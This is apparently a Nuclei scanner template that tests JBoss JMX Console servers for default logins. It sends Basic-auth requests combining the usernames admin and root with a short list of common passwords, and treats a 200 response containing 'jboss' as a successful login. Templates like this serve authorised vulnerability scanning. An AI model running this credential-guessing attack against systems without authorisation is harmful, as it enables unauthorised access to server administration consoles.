id: jboss-jmx-console-default
info:
  name: Jboss-jmx-console-default-login
  author: paradessia 
  severity: high
  tags: jboss,default-login

requests:

  - payloads:
      username:
        - admin
        - root
      password:
        - admin
        - 12345
        - 123456
        - 1234
        - 123456789
        - 123qwe
        - root
    attack: clusterbomb  # Available options: sniper, pitchfork and clusterbomb
    raw:
      # Request with simple param and header manipulation with DSL functions
      - |
        GET /jmx-console/ HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}
        User-Agent:  Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
        Accept-Language: en-US,en;q=0.9
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - jboss
